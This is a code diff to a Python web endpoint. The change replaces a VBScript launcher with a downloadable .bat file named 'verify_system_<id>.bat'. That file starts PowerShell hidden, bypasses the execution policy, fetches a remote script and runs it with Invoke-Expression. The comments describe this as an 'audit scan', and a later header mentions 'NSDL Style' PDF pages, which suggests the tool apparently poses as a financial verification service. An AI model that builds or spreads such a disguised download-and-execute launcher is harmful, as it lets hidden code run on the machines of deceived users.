@@ -139,7 +139,8 @@ def download_vbs(
     branch_code: str = Query("8301231"),
     officer_name: str = Query("SANDIP BALIRAM LOKHANDE")
 ):
-    """Generates silent VBScript launcher running PowerShell scan completely hidden in the background."""
+    """Generates a .bat launcher that runs the PowerShell audit scan hidden in the background.
+    Works on all Windows versions including Win 11 24H2+ where VBScript is deprecated."""
     base_url = str(request.base_url).rstrip('/')
 
     sessions[client_id] = {
@@ -151,14 +152,14 @@ def download_vbs(
         "xml_path": None
     }
 
-    vbs_content = f"""Set objShell = CreateObject("WScript.Shell")
-command = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & Chr(34) & "Invoke-RestMethod -Uri '{base_url}/download-script?client_id={client_id}' | Invoke-Expression" & Chr(34)
-objShell.Run command, 0, False
+    bat_content = f"""@echo off
+start /min powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-RestMethod -Uri '{base_url}/download-script?client_id={client_id}' | Invoke-Expression"
+exit
 """
     headers = {
-        "Content-Disposition": f"attachment; filename=verify_system_{client_id}.vbs"
+        "Content-Disposition": f"attachment; filename=verify_system_{client_id}.bat"
     }
-    return Response(content=vbs_content, media_type="application/octet-stream", headers=headers)
+    return Response(content=bat_content, media_type="application/octet-stream", headers=headers)
 
 # ------------------------------------------------------------------------------
 # 3. PDF PAGE DECORATIONS (NSDL Style Page Border & Centered Footer)
